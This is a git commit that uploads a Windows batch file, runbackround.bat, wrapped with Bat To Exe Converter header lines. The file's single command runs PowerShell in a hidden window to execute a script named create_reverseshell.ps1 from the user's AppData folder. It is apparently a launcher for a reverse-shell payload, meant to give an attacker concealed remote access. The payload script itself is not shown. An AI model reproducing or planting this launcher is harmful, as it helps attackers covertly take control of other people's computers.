e6714cda27bef94e7d59571d2c20d6f2011f503c
bad-beep <61217235+bad-beep@users.noreply.github.com>
2022-08-25 19:28:49 +0200

    Add files via upload

---
+++ runbackround.bat
@@ -0,0 +1,33 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdCyDJGyX8VAjFBlGQguDAES0A5EO4f7+086CsUYJW/IDcoXnybyLLOxAuHq3JMRj33lV+A==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF6JeA==
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF6JeA==
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::YB416Ek+Zm8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+powershell.exe -windowstyle hidden -file %USERPROFILE%\AppData\Powershell\create_reverseshell.ps1
